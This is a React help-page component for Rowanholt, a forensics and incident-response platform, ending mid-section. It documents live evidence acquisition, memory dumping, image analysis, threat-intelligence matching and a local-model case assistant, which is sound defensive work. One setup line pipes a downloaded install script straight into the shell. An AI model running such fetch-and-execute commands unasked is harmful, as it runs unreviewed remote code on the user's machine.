import React, { useState } from 'react';
import './HelpPage.css';

// The backend's app_version (src/web/backend/config.py), package.json and docs/CLI.md
const VERSION = '2.1.0';
const REPO = 'https://github.com/cmdaltr/rowanholt';
const doc = (name) => `${REPO}/blob/main/docs/${name}`;

const heroImage = `${process.env.PUBLIC_URL}/images/rowanholt.png`;
const architectureMap = `${process.env.PUBLIC_URL}/architecture/rowanholt-architecture.html`;
const architecturePages = [
  { href: `${architectureMap}#realm`, preview: 'realm.jpg', title: 'The realm: Gandalf to Elrond to Aulë' },
  { href: `${architectureMap}#elrond`, preview: 'elrond.jpg', title: "Elrond's roads: branching by evidence and OS" },
  {
    href: `${process.env.PUBLIC_URL}/architecture/gandalf-acquisition.html`,
    preview: 'gandalf.jpg',
    title: "Gandalf's acquisition flow",
  },
  {
    href: `${process.env.PUBLIC_URL}/architecture/rowanholt-journey.html`,
    preview: 'journey.jpg',
    title: "The evidence's journey (interactive 3D)",
  },
];

const ExternalLink = ({ href, children }) => (
  <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>
);

const Code = ({ children }) => <pre className="code-block">{children}</pre>;

/**
 * A flow diagram: stages left to right (top to bottom when narrow), each a chain of steps,
 * joined by arrows labelled with what passes between them.
 * stages: [{ who, title, tone, via, steps: [[title, detail], ...] }]; `via` labels the arrow
 * into that stage. `dense` drops the labels for diagrams with many stages.
 */
const Flow = ({ label, stages, caption, dense = false }) => (
  <figure className={`hp-flow${dense ? ' hp-flow--dense' : ''}`} role="group" aria-label={label}>
    <div className="hp-flow__track">
      {stages.map((stage, i) => (
        <React.Fragment key={stage.title}>
          {i > 0 && (
            <div className="hp-flow__link" aria-hidden="true">
              <div className="hp-flow__arrow" />
              {stage.via && <div className="hp-flow__via">{stage.via}</div>}
            </div>
          )}
          <div className={`hp-flow__stage hp-tone-${stage.tone || 'green'}`}>
            {stage.who && <span className="hp-flow__who">{stage.who}</span>}
            <span className="hp-flow__title">{stage.title}</span>
            <ul className="hp-flow__steps">
              {stage.steps.map(([title, detail]) => (
                <li key={title}>
                  <strong>{title}</strong>
                  {detail && <span>{detail}</span>}
                </li>
              ))}
            </ul>
          </div>
        </React.Fragment>
      ))}
    </div>
    {caption && <figcaption>{caption}</figcaption>}
  </figure>
);

const investigationStages = [
  {
    who: 'Gandalf',
    title: 'Collect from the host',
    tone: 'parchment',
    steps: [
      ['Live state', 'connections, processes'],
      ['Memory', 'AVML, osxpmem, DumpIt'],
      ['Journals and logs', 'in order of volatility'],
      ['Everything else', 'registry, persistence, users'],
      ['Hash and archive', <>SHA-256 into <code>log.meta</code>, with <code>log.audit</code></>],
    ],
  },
  {
    who: 'Elrond',
    title: 'Analyse the case',
    tone: 'green',
    via: <>archive + <code>log.meta</code></>,
    steps: [
      ['Identify and mount', <>or extract and re-hash: <code>gandalf_integrity</code></>],
      ['Collect', <>artefacts into <code>raw/</code></>],
      ['Process', <>tables into <code>cooked/</code> (JSONL)</>],
      ['Analyse', 'MFT, stacking, IOCs, YARA, threat intel'],
      ['ATT&CK and timeline', 'techniques per row, Navigator layer, Plaso'],
      ['Export', 'Splunk, Elastic, OpenSearch, Timesketch'],
    ],
  },
  {
    who: 'Case browser',
    title: 'Work it together',
    tone: 'teal',
    via: 'case directory',
    steps: [
      ['Browse tables', <>read-only, never <code>raw/</code></>],
      ['Flag rows', 'lead, confirmed or benign'],
      ['Notes and hosts', 'assign, comment, activity feed'],
    ],
  },
  {
    who: 'Aulë',
    title: 'Ask questions',
    tone: 'copper',
    via: 'rows and findings',
    steps: [
      ['Free text with Ollama', <>answers cite rows <code>[R1]</code>…</>],
      ['Fixed questions without', 'read straight from the files'],
      ['Flag a cited row', 'as a lead or a finding'],
    ],
  },
  {
    who: 'Report',
    title: 'Write it up',
    tone: 'leaf',
    via: 'confirmed findings',
    steps: [
      ['DOCX or Markdown', 'from the case browser'],
      ['Findings first', 'then leads, then Elrond\'s report'],
      ['Every claim cited', 'host, file, row, row hash'],
    ],
  },
];

const elrondStages = [
  {
    who: 'Evidence',
    title: 'What you give it',
    tone: 'parchment',
    steps: [
      ['Disk and memory images', <><code>--Collect</code>: E01, raw, VMDK, VHD</>],
      ['Gandalf archives', <><code>--Gandalf</code>: zip, 7z, tar.gz</>],
      ['Captures and flows', <><code>--Network</code>: PCAP, Zeek, NetFlow</>],
      ['Phones', <><code>--Mobile</code>: backups, extractions</>],
      ['Attack datasets', <><code>--Mordor</code></>],
    ],
  },
  {
    who: 'Identify',
    title: 'Mount and branch',
    tone: 'green',
    via: 'one host each',
    steps: [
      ['Mount', 'ewfmount, qemu-nbd, apfs-fuse'],
      ['Branch by OS', 'Windows, Linux, macOS'],
      ['Shadow copies', <><code>--vss</code></>],
    ],
  },
  {
    who: 'Collect',
    title: 'Copy artefacts',
    tone: 'green',
    via: 'mounted volume',
    steps: [
      ['System artefacts', 'registry, event logs, $MFT, logs'],
      ['User profiles', <><code>--Userprofiles</code></>],
      ['Files by type', <><code>--collectFiles</code></>],
    ],
  },
  {
    who: 'Process',
    title: 'Parse to tables',
    tone: 'teal',
    via: <code>raw/</code>,
    steps: [
      ['Cooked tables', 'host, artefact, source, time, techniques'],
      ['Memory', <><code>--Memory</code>: Volatility 3</>],
      ['Timeline', <><code>--Timeline</code>: Plaso</>],
    ],
  },
  {
    who: 'Analyse',
    title: 'Look for the odd',
    tone: 'copper',
    via: <code>cooked/</code>,
    steps: [
      ['MFT and stacking', <><code>--Analysis</code></>],
      ['IOCs, YARA, ClamAV', <><code>--extractIocs</code>, <code>--Yara</code></>],
      ['Threat intelligence', <><code>--threatIntel</code></>],
    ],
  },
  {
    who: 'Output',
    title: 'Hand it on',
    tone: 'leaf',
    via: <code>analysis/</code>,
    steps: [
      ['ATT&CK', <><code>mitre_techniques.txt</code>, <code>--Navigator</code></>],
      ['SIEMs', <><code>--Splunk</code>, <code>--Elastic</code>, <code>--OpenSearch</code></>],
      ['Report', <><code>--Report</code>: DOCX, Markdown</>],
    ],
  },
];

const gandalfStages = [
  {
    who: 'Gandalf',
    title: 'Copy in order of volatility',
    tone: 'parchment',
    steps: [
      ['1. Live state', 'connections, processes'],
      ['2. Memory', <><code>-M</code>: DumpIt, AVML, osxpmem</>],
      ['3. Rest of the live state', 'services, modules, sessions'],
      ['4. Journals', '$LogFile, $UsnJrnl, page and swap files, $MFT'],
      ['5. Logs that roll over', 'event logs, /var/log, prefetch'],
      ['6. Everything else', 'registry, persistence, users'],
    ],
  },
  {
    who: 'Gandalf',
    title: 'Seal',
    tone: 'green',
    via: 'local working copy',
    steps: [
      ['Hash every file', <>SHA-256 into <code>log.meta</code></>],
      ['Record what was taken', <><code>log.audit</code>, with times</>],
      ['Archive', 'zip (Python, PowerShell) or tar.gz (bash)'],
      ['Encrypt', <>Key (<code>&lt;host&gt;.shadowfax.key</code>), Password or None</>],
    ],
  },
  {
    who: 'Elrond',
    title: 'Check on arrival',
    tone: 'teal',
    via: 'archive',
    steps: [
      ['Extract', <>into <code>&lt;host&gt;/artefacts/raw/</code></>],
      ['Hash again', <>against <code>log.meta</code></>],
      ['Record the result', <><code>gandalf_integrity.jsonl</code>: verified, MISMATCH, missing, unhashed</>],
    ],
  },
];

const pippinStages = [
  {
    who: 'Sources',
    title: 'What Pippin imports',
    tone: 'parchment',
    steps: [
      ['XLSX', 'the ten-column layout, any sheet'],
      ['CSV', 'the ten columns, or MITRESaw\'s procedures export'],
      ['STIX 2.1', 'bundles (JSON)'],
      ['TAXII 2.1', 'a collection, pulled'],
      ['Watchlist', <><code>.txt</code>, one value per line</>],
    ],
  },
  {
    who: 'Pippin',
    title: 'Hold the indicators',
    tone: 'green',
    via: 'import',
    steps: [
      ['Ten columns', 'element, group, procedure, technique, tactic…'],
      ['Validity', 'STIX\'s own, else 90 days for IPs and domains'],
      ['Expired', 'still listed, left out of matching'],
    ],
  },
  {
    who: 'Uses',
    title: 'Where they are matched',
    tone: 'teal',
    via: 'live indicators',
    steps: [
      ['Elrond', <><code>--threatIntel</code>: matches per host, groups ranked per case</>],
      ['Check a value', 'one value, the indicators and groups it hits'],
      ['Aulë', 'the threat intelligence question; single values'],
    ],
  },
];

const findingStages = [
  {
    who: 'Case browser',
    title: 'A row',
    tone: 'teal',
    steps: [
      ['Any cooked or analysis row', 'host, file, row number, SHA-256'],
    ],
  },
  {
    who: 'Analyst or Aulë',
    title: 'Lead',
    tone: 'copper',
    via: 'flag',
    steps: [
      ['Worth a look', 'Aulë can only ever flag leads'],
    ],
  },
  {
    who: 'Analyst',
    title: 'Confirmed or benign',
    tone: 'green',
    via: 'decide',
    steps: [
      ['A verdict', 'changed by a colleague? not silently overwritten'],
    ],
  },
  {
    who: 'Output',
    title: 'Report and layer',
    tone: 'leaf',
    via: 'confirmed only',
    steps: [
      ['Report (DOCX, Markdown)', 'whether each row is unchanged'],
      ['Navigator layer', 'confirmed findings\' techniques'],
    ],
  },
];

const HelpPage = () => {
  const [activeSection, setActiveSection] = useState('overview');

  const sections = {
    overview: {
      title: 'Overview',
      content: (
        <>
          <section>
            <h3>Rowanholt</h3>
            <p>
              Rowanholt is a DFIR platform in three parts. Gandalf acquires from live hosts, in order of volatility,
              with a SHA-256 manifest. Elrond turns disk and memory images, Gandalf archives, captures and phone
              backups into a case directory of tables, tagged with ATT&amp;CK techniques. Aulë answers questions
              about the case from those tables, with a local model through Ollama or fixed answers without one.
              Around them: Pippin holds threat intelligence, Mordor holds attack datasets and the lab's recordings,
              and Aragorn administers the stack.
            </p>
          </section>

          <section>
            <h4>Architecture</h4>
            <p>
              The whole platform drawn as a map of Middle-earth, Elrond's directed graph as it branches by evidence
              type and operating system, how Gandalf acquires from a live host, and the whole platform as an
              interactive 3D journey across Middle-earth. Open any of them full size.
            </p>
            <div className="hp-maps">
              {architecturePages.map((page) => (
                <a key={page.preview} href={page.href} target="_blank" rel="noopener noreferrer">
                  <img src={`${process.env.PUBLIC_URL}/architecture/${page.preview}`} alt={page.title} />
                  <span>{page.title}</span>
                </a>
              ))}
            </div>
          </section>

          <section>
            <h4>What it does</h4>
            <ul className="hp-cols">
              <li><strong>Acquisition (Gandalf):</strong> Windows, Linux and macOS, locally or over SSH and PSRemoting</li>
              <li><strong>Analysis (Elrond):</strong> 30+ forensic tools behind one command line</li>
              <li><strong>ATT&amp;CK:</strong> techniques tagged on every row, Navigator layers per case</li>
              <li><strong>Memory:</strong> Volatility 3, with a memory timeline</li>
              <li><strong>Timelines:</strong> Plaso, and a time on every record</li>
              <li><strong>Cloud and containers:</strong> AWS, Azure, GCP, Docker hosts, Kubernetes audit logs</li>
              <li><strong>Network and phones:</strong> Zeek, NetFlow, iLEAPP and ALEAPP</li>
              <li><strong>Stacking:</strong> what few hosts of the same OS have, ranked with its reasons</li>
              <li><strong>Threat intelligence (Pippin):</strong> STIX, TAXII, MITRESaw, watchlists</li>
              <li><strong>Case browser:</strong> findings, notes and hosts shared by the team</li>
              <li><strong>Aulë:</strong> questions answered from the case, every answer citing its rows</li>
              <li><strong>SIEMs:</strong> Splunk, Elastic, OpenSearch and Wazuh, Timesketch</li>
            </ul>
          </section>
        </>
      ),
    },
    running: {
      title: 'Day to Day',
      content: (
        <>
          <section>
            <h3>Running Rowanholt</h3>
            <p>
              You're reading this in the web app, so it's installed and running. These are the commands for
              keeping it that way; the first install is in the repository's{' '}
              <ExternalLink href={doc('QUICKSTART.md')}>QUICKSTART.md</ExternalLink>. They assume the{' '}
              <code>rowanholt</code> command is on your PATH (<code>./rowanholt install</code> from the checkout,
              once).
            </p>

            <h4>Starting and stopping</h4>
            <Code>{`rowanholt start              # the whole stack, Splunk and Elastic included
rowanholt start --testing    # without Splunk and Elastic
rowanholt status
rowanholt restart
rowanholt stop`}</Code>
            <table className="hp-table">
              <thead><tr><th>Service</th><th>Address</th><th>Started by</th></tr></thead>
              <tbody>
                <tr><td>Web app</td><td><code>http://localhost:5687</code></td><td>both</td></tr>
                <tr><td>API</td><td><code>http://localhost:5688</code></td><td>both</td></tr>
                <tr><td>Splunk</td><td><code>http://localhost:7755</code></td><td><code>rowanholt start</code></td></tr>
                <tr><td>Kibana</td><td><code>http://localhost:5601</code></td><td><code>rowanholt start</code></td></tr>
                <tr><td>ATT&amp;CK Navigator</td><td><code>http://localhost:5602</code></td><td><code>rowanholt start</code></td></tr>
              </tbody>
            </table>
          </section>

          <section>
            <h4>Watching the containers</h4>
            <Code>{`rowanholt anduril status                    # containers, state, health
rowanholt anduril logs celery-worker -n 200 # Elrond's output
rowanholt anduril restart frontend
rowanholt jobs status                       # the analysis jobs`}</Code>
            <p>
              Anduril refuses to stop or rebuild the worker, Postgres or Redis while a job is running unless you
              pass <code>--force</code>. The same administration is on the web under Aragorn, for admins.
            </p>
          </section>

          <section>
            <h4>Updating</h4>
            <p>
              A git checkout: pull, then rebuild the worker, which copies Elrond in when it's built. The web app
              and API read the checkout directly and reload on their own.
            </p>
            <Code>{`git -C "$(rowanholt where)" pull
rowanholt anduril rebuild celery-worker`}</Code>
            <p>
              The desktop app offers to update its own copy when a newer version launches, and the next{' '}
              <code>rowanholt start</code> rebuilds the images once. A team server's checkout is rebuilt the same
              way after a pull.
            </p>
          </section>

          <section>
            <h4>What's optional</h4>
            <ul className="hp-cols hp-cols--2">
              <li><strong>Ollama:</strong> Aulë's free-text answers, summaries and suggestions. Without it Aulë still answers fixed questions</li>
              <li><strong>Splunk and Elastic:</strong> <code>rowanholt start</code> without <code>--testing</code>; OpenSearch, Wazuh and Timesketch are your own, set in <code>.env</code></li>
              <li><strong>Online lookups:</strong> VirusTotal from Pippin and ClamAV's signature refresh, both off unless <code>.env</code> turns them on</li>
              <li><strong>A team server:</strong> <code>rowanholt server init</code> puts sign-in, TLS and per-user jobs in front</li>
            </ul>
          </section>

          <section>
            <h4>Where the docs are</h4>
            <ul className="hp-cols">
              <li><ExternalLink href={doc('CLI.md')}>CLI.md</ExternalLink>: every command and option</li>
              <li><ExternalLink href={doc('USAGE.md')}>USAGE.md</ExternalLink>: the web app, page by page</li>
              <li><ExternalLink href={doc('API.md')}>API.md</ExternalLink>: the HTTP API</li>
              <li><ExternalLink href={doc('AULE.md')}>AULE.md</ExternalLink>: Aulë and its MCP server</li>
              <li><ExternalLink href={doc('OUTPUT_FORMAT.md')}>OUTPUT_FORMAT.md</ExternalLink>: the case directory</li>
              <li><ExternalLink href={doc('SERVER.md')}>SERVER.md</ExternalLink>: running it for a team</li>
            </ul>
            <p>The same files are under <code>docs/</code> in your checkout.</p>
          </section>
        </>
      ),
    },
    cli: {
      title: 'Command Line',
      content: (
        <>
          <section>
            <h3>The rowanholt Command</h3>
            <p>
              One command runs everything: the Docker stack, Gandalf, Elrond, Mordor, Anduril, the lab and every
              script under <code>scripts/</code>. Link it into a directory on your PATH once and it runs from anywhere.
            </p>
            <Code>{`cd rowanholt
./rowanholt install   # links ~/.local/bin/rowanholt
rowanholt help`}</Code>
          </section>

          <section>
            <h4>Commands</h4>
            <table className="hp-table">
              <thead><tr><th>Command</th><th>Runs</th></tr></thead>
              <tbody>
                <tr><td><code>rowanholt start | stop | restart | status</code></td><td>The Docker stack; <code>--testing</code> leaves out Splunk and Elastic, <code>--logs</code> follows the logs</td></tr>
                <tr><td><code>rowanholt gandalf [bash|python] &lt;args&gt;</code></td><td>Gandalf on a Linux or macOS host (<code>gandalf.sh</code> by default)</td></tr>
                <tr><td><code>rowanholt acquire &lt;args&gt;</code></td><td>Gandalf through the Python CLI</td></tr>
                <tr><td><code>rowanholt analyse &lt;args&gt;</code></td><td>Elrond with the common phases (<code>-C</code>, <code>-P</code>, <code>-A</code>, <code>-B</code>, <code>-S</code>, <code>-E</code>); <code>elrond.py</code> takes the rest</td></tr>
                <tr><td><code>rowanholt mordor &lt;command&gt;</code></td><td>Datasets: <code>list</code>, <code>download</code>, <code>info</code>, <code>local</code>, <code>verify</code>, <code>refresh</code></td></tr>
                <tr><td><code>rowanholt anduril &lt;command&gt;</code></td><td>Rowanholt's containers and images</td></tr>
                <tr><td><code>rowanholt mcp</code></td><td>Aulë's MCP server over stdio</td></tr>
                <tr><td><code>rowanholt lab &lt;command&gt;</code></td><td>The test lab</td></tr>
                <tr><td><code>rowanholt scripts</code></td><td>Every script under <code>scripts/</code>; run one as <code>rowanholt &lt;group&gt; &lt;name&gt;</code>, e.g. <code>rowanholt jobs status</code></td></tr>
                <tr><td><code>rowanholt map [realm|elrond|gandalf|journey]</code></td><td>Opens an architecture page</td></tr>
                <tr><td><code>rowanholt where</code></td><td>Prints the checkout's path</td></tr>
              </tbody>
            </table>
            <p>
              Forensic commands keep the directory you run them from, so relative evidence and output paths work as
              typed; scripts and the stack run from the repository root. Set <code>ROWANHOLT_PYTHON</code> to use a
              virtualenv. On Windows, run <code>Invoke-Gandalf.ps1</code> from <code>src/acquisition/windows</code>.
            </p>
          </section>

          <section>
            <h4>Python modules</h4>
            <p>
              Run these from the repository root, not from inside <code>src/analysis</code>, where Elrond's{' '}
              <code>platform/</code> package shadows the standard library's.
            </p>
            <Code>{`python3 src/analysis/elrond.py --help
python3 -m src.analysis.mitre.cli --help
python3 -m src.analysis.rowanholt.cloud.cli --help
python3 -m src.analysis.rowanholt.ai.cli --help`}</Code>
          </section>
        </>
      ),
    },
    gandalf: {
      title: 'Gandalf',
      content: (
        <>
          <section>
            <h3>Acquisition</h3>
            <p>
              Gandalf collects from a live Windows, Linux or macOS host, locally or remotely, copying everything to
              its working directory in order of volatility before it hashes anything, so hashing doesn't widen the
              window in which the host changes under it.
            </p>
            <Flow
              label="Gandalf copies in order of volatility, hashes into log.meta, archives, and Elrond re-hashes on arrival"
              stages={gandalfStages}
              caption="The collection still writes to the disk it collects from (C:\TEMP\gandalf, /tmp/gandalf). Writing to other media with -O avoids changing $MFT and the journals."
            />
          </section>

          <section>
            <h4>Basic usage</h4>
            <p>
              Every collector takes an encryption mode (<code>Key</code>, <code>Password</code> or <code>None</code>)
              and an acquisition mode (<code>Local</code> or <code>Remote</code>). Remotely, bash takes a host
              with <code>-h</code> or a list with <code>-f</code>, the Python collector reads{' '}
              <code>src/acquisition/lists/hosts.list</code>, and PowerShell uses PSRemoting.
            </p>

            <h5>Linux and macOS (bash)</h5>
            <Code>{`sudo ./src/acquisition/bash/gandalf.sh Password Local -m -o /evidence
sudo ./src/acquisition/bash/gandalf.sh Key Remote -h 192.168.1.100 -u analyst
rowanholt gandalf Key Local -m   # the same, from anywhere`}</Code>

            <h5>Linux and macOS (Python)</h5>
            <Code>{`cd src/acquisition
sudo python3 python/gandalf.py Key Local -M -O /evidence/CASE-001
sudo python3 python/gandalf.py Password Remote -O /evidence/CASE-001`}</Code>

            <h5>Windows (PowerShell, as administrator)</h5>
            <Code>{`.\\src\\acquisition\\windows\\Invoke-Gandalf.ps1 \`
  -EncryptionObject Key -Acquisition Local \`
  -OutputDirectory C:\\TEMP\\gandalf\\gandalf \`
  -Memory -CollectFiles`}</Code>
          </section>

          <section>
            <h4>Collection options</h4>
            <table className="hp-table">
              <thead><tr><th>Bash</th><th>Python</th><th>PowerShell</th><th>Does</th></tr></thead>
              <tbody>
                <tr><td><code>-o DIR</code></td><td><code>-O DIR</code></td><td><code>-OutputDirectory</code></td><td>Where the archive goes</td></tr>
                <tr><td><code>-m</code></td><td><code>-M</code></td><td><code>-Memory</code></td><td>Memory dump (AVML, osxpmem, DumpIt)</td></tr>
                <tr><td><code>-a</code></td><td><code>-A</code></td><td>—</td><td>Last-access times for every file</td></tr>
                <tr><td><code>-c</code></td><td><code>-F</code></td><td><code>-CollectFiles</code></td><td>Files named in <code>lists/files.list</code></td></tr>
                <tr><td><code>-l</code></td><td><code>-L</code></td><td><code>-LiveContainers</code></td><td>Ask Docker and Podman about running containers (off by default)</td></tr>
                <tr><td><code>-h HOST -u USER</code>, <code>-f FILE</code></td><td><code>hosts.list</code></td><td>PSRemoting</td><td>Remote targets</td></tr>
              </tbody>
            </table>
          </section>

          <section>
            <h4>Encryption modes</h4>
            <ul className="hp-cols">
              <li><strong>Key:</strong> a random key per host, written beside the archive as <code>&lt;host&gt;.shadowfax.key</code> (recommended)</li>
              <li><strong>Password:</strong> a key derived from a password you type (PBKDF2)</li>
              <li><strong>None:</strong> no encryption</li>
            </ul>
          </section>
        </>
      ),
    },
    elrond: {
      title: 'Elrond',
      content: (
        <>
          <section>
            <h3>Analysis</h3>
            <p>
              Elrond takes evidence of any kind it knows, branches by evidence type and operating system, and
              writes one case directory: per host, <code>raw/</code> as collected, <code>cooked/</code> as JSON Lines
              tables and <code>analysis/</code>; for the case, the audit log, <code>mitre_techniques.txt</code> and
              the method. Every row starts with its host, artefact, source path, time (UTC) and ATT&amp;CK
              techniques.
            </p>
            <Flow
              label="Elrond: evidence in, identified and mounted, collected, processed, analysed, and output"
              stages={elrondStages}
              dense
              caption="Each step is a flag on elrond.py; the web app's New Analysis builds the same command."
            />
          </section>

          <section>
            <h4>What it reads and finds</h4>
            <ul className="hp-cols">
              <li>Registry, event logs, $MFT, USN journal, prefetch, Amcache, SRUM</li>
              <li>Browsers, LNK files, jump lists, scheduled tasks, BITS</li>
              <li>Linux and macOS persistence, logs, unified log, users</li>
              <li>Docker hosts' containers and Kubernetes nodes' pods</li>
              <li>Memory with Volatility 3, and a memory timeline</li>
              <li>Timelines with Plaso</li>
              <li>Timestomping and unusual alternate data streams</li>
              <li>IOCs, YARA, ClamAV, keywords, misplaced binaries</li>
              <li>Stacking across hosts, ranked with its reasons</li>
              <li>Threat intelligence matches against Pippin's indicators</li>
              <li>Network captures through Zeek, NetFlow exports</li>
              <li>Phones through iLEAPP and ALEAPP</li>
            </ul>
          </section>

          <section>
            <h4>From the command line</h4>
            <p>
              Elrond takes the case ID, one or more sources and the output directory, then long options only (an
              unambiguous prefix works: <code>--Coll</code>). Memory images are read from the source directory with
              the disk images. Full list: <ExternalLink href={doc('CLI.md#elrond---analysis')}>CLI.md</ExternalLink>.
            </p>
            <div className="hp-shell">
              <div>
                <h5>A disk image</h5>
                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
  /evidence /output/CASE-001 \\
  --Collect --Process --Analysis`}</Code>
              </div>
              <div>
                <h5>Gandalf archives, with memory</h5>
                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
  /evidence/CASE-001/acquisitions/ /output/CASE-001 \\
  --Gandalf --Process --Analysis --Memory`}</Code>
              </div>
              <div>
                <h5>With a timeline and IOCs</h5>
                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
  /evidence /output/CASE-001 \\
  --Collect --Process --Analysis \\
  --Timeline --extractIocs`}</Code>
              </div>
              <div>
                <h5>Index a finished case into SIEMs</h5>
                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
  /output/CASE-001 \\
  --Index --Splunk --Elastic --Navigator`}</Code>
              </div>
            </div>
            <p>
              <code>--Timeline</code> and <code>--extractIocs</code> are the slow ones: Plaso took 105 minutes on a
              12 GB E01, and IOC extraction added 43.
            </p>
          </section>

          <section>
            <h4>Processing modes in the web app</h4>
            <ul className="hp-cols hp-cols--2">
              <li><strong>Brisk:</strong> processing, analysis, IOCs, user profiles and the Navigator layer</li>
              <li><strong>Exhaustive:</strong> every option, SIEMs, memory and timelines included</li>
              <li><strong>Custom:</strong> pick each option yourself</li>
              <li><strong>Template:</strong> a set of custom options you saved earlier</li>
            </ul>
            <p>
              On the Confirm step, Save as Template keeps the current options; Template mode lists them, with × to
              delete one. Templates are kept in this browser, not on the server.
            </p>
          </section>
        </>
      ),
    },
    pippin: {
      title: 'Pippin',
      content: (
        <>
          <section>
            <h3>Threat Intelligence</h3>
            <p>
              Pippin holds the indicators Elrond matches cases against and Aulë checks single values with, in ten
              columns: evidential element, threat group, procedure example, technique ID and name, tactic,
              contextual evidence, reference URL, Navigator layer URL and source type. Most of them come from
              MITRE ATT&amp;CK's procedures, through MITRESaw.
            </p>
            <Flow
              label="Pippin imports XLSX, CSV, STIX, TAXII and watchlists, keeps them with their validity, and they are matched by Elrond, Check a value and Aulë"
              stages={pippinStages}
            />
          </section>

          <section>
            <h4>Matching a case</h4>
            <p>
              Tick Threat Intelligence on Elrond's page, or give Elrond <code>--threatIntel</code> and the files.
              Each host gets <code>analysis/threat_intel_matches.jsonl</code>, and the case gets{' '}
              <code>threat_groups.jsonl</code>: groups ranked by what matched, each with the basis for its rank
              (atomic indicators, specific procedures, common tooling, or technique overlap only). Built-ins,
              ordinary words and elements many groups share don't count as attribution.
            </p>
            <Code>{`python3 src/analysis/elrond.py CASE-001 \\
  /evidence/CASE-001 /cases/CASE-001 \\
  --Gandalf --Process --Analysis \\
  --threatIntel <indicators>.xlsx <bundle>.json`}</Code>
          </section>

          <section>
            <h4>Checking one value</h4>
            <p>
              Paste a process name, command line, path, IP, domain or hash into Check a value: Pippin lists the
              indicators it matches and how many groups share each one.
            </p>
          </section>
        </>
      ),
    },
    mordor: {
      title: 'Mordor',
      content: (
        <>
          <section>
            <h3>Attack Datasets and Recorded Telemetry</h3>
            <p>
              Mordor holds attack telemetry: public datasets recorded by others, and the lab's own recordings of
              Atomic Red Team tests run on its machines (Aragorn → Deploy). Each recording is mapped to the
              ATT&amp;CK technique it exercises, so the Mordor page shows which logs record each technique.
            </p>
            <h4>Sources</h4>
            <ul className="hp-cols">
              <li><strong>Your lab:</strong> your own recordings, never committed</li>
              <li><ExternalLink href="https://github.com/splunk/attack_data">Splunk attack_data</ExternalLink></li>
              <li><ExternalLink href="https://github.com/OTRF/Security-Datasets">Security-Datasets (OTRF)</ExternalLink></li>
              <li>EVTX-to-MITRE-Attack</li>
              <li>macOS-ATTACK-DATASET (local only)</li>
              <li>Microsoft GUIDE (alerts, not logs)</li>
            </ul>
          </section>

          <section>
            <h4>From the command line</h4>
            <p>
              Datasets download to <code>/tmp/rowanholt/mordor</code> by default. Elrond reads one as a case
              with <code>--Mordor</code>.
            </p>
            <Code>{`rowanholt mordor list --technique T1059.001
rowanholt mordor download <dataset-id>
rowanholt mordor local
rowanholt mordor verify <dataset-id>`}</Code>
          </section>
        </>
      ),
    },
    aule: {
      title: 'Aulë',
      content: (
        <>
          <section>
            <h3>Aulë, the AI Analyst</h3>
            <p>
              Aulë answers questions about a case from Elrond's output. It's named after Aulë (OW-leh), the smith of
              the Valar in Tolkien's legendarium, maker of the Dwarves.
            </p>
            <ul className="hp-cols hp-cols--2">
              <li><strong>With Ollama:</strong> free-text answers, summaries and suggestions from a local model. The model is given the case's rows tagged <code>[R1]</code>, <code>[R2]</code>…, and an answer lists only the rows it cites that it was actually given</li>
              <li><strong>Without:</strong> fixed questions answered straight from the case files: hosts, techniques, persistence, logins, IOCs, suspicious commands, threat intelligence, what's rare, confirmed findings</li>
              <li><strong>Flagging:</strong> every cited row has ⚑, to flag it as a lead or a finding as the case browser would</li>
              <li><strong>Nothing leaves the machine:</strong> there is no hosted-model backend</li>
            </ul>
          </section>

          <section>
            <h4>Setting up the model</h4>
            <p>
              The default, <code>llama3.2:3b</code>, runs anywhere but misreads cases; an 8B model such as{' '}
              <code>qwen3:8b</code> (about 5 GB) is the smallest worth relying on. Set it in <code>.env</code> as{' '}
              <code>ROWANHOLT_MODEL_NAME</code> and restart the stack.
            </p>
            <Code>{`brew install ollama   # macOS; Linux: curl -fsSL https://ollama.com/install.sh | sh
ollama pull qwen3:8b
ollama list`}</Code>
          </section>

          <section>
            <h4>From the command line</h4>
            <p>
              The CLI indexes a case into a vector store and asks a local model over it. Run it from the repository
              root.
            </p>
            <Code>{`python3 -m src.analysis.rowanholt.ai.cli index CASE-001 /cases/CASE-001
python3 -m src.analysis.rowanholt.ai.cli query CASE-001 \\
  "What PowerShell commands were executed?"
python3 -m src.analysis.rowanholt.ai.cli summary CASE-001 \\
  --format markdown -o summary.md`}</Code>
          </section>

          <section>
            <h4>From an MCP host</h4>
            <p>
              <code>rowanholt mcp</code> runs Aulë's MCP server over stdio for Claude Desktop, Claude Code and the like.
              It's read-only and a client of Rowanholt's own API, so it never reaches <code>raw/</code>. With{' '}
              <code>--allow-writes</code> it can flag leads and add notes, recorded as Aulë's, and nothing else. Setup
              and the tool list: <ExternalLink href={doc('AULE.md')}>AULE.md</ExternalLink>.
            </p>
          </section>

          <section>
            <h4>Questions worth asking</h4>
            <ul className="hp-cols">
              <li>"What were the initial access vectors?"</li>
              <li>"What persistence mechanisms were used?"</li>
              <li>"Show all credential access attempts"</li>
              <li>"What lateral movement was observed?"</li>
              <li>"Which logons failed, and from where?"</li>
              <li>"What ran from a user-writable path?"</li>
            </ul>
          </section>
        </>
      ),
    },
    features: {
      title: 'Features',
      content: (
        <>
          <section>
            <h3>Working a Case Together</h3>
            <p>
              Browse Case on a completed job opens its cooked artefacts and analysis, read-only. Flag rows as
              findings, keep notes, assign hosts and follow the activity feed. A row someone already flagged can't be
              flagged twice. Download as CSV gives a table, or the rows the filter shows, as a spreadsheet.
            </p>
            <Flow label="A row is flagged as a lead, decided as confirmed or benign, and confirmed findings go into the report and Navigator layer" stages={findingStages} />
          </section>

          <section>
            <h4>Case report</h4>
            <p>
              Report (DOCX) and Report (Markdown) in the case browser download the case report: the case notes and
              confirmed findings first, each with its row and whether the row is unchanged since it was flagged; then
              the open leads and dismissed rows; then Elrond's own report of the case. That part covers the hosts
              and the timespan of their records, every ATT&amp;CK technique with the rows behind it, the indicators,
              Gandalf's integrity check and the method: Elrond's options and the versions of its tools. Every claim
              is cited by host, file, row and the row's hash. The first download of a large case reads all its tables
              and takes a few minutes; the second format is quick. Elrond's <code>--Report</code> writes the same
              report from the case alone into the case folder.
            </p>
            <Code>{`cd src/analysis
python3 -m rowanholt.report /cases/CASE-001 --out ~/reports`}</Code>
          </section>

          <section>
            <h4>MITRE ATT&amp;CK</h4>
            <p>
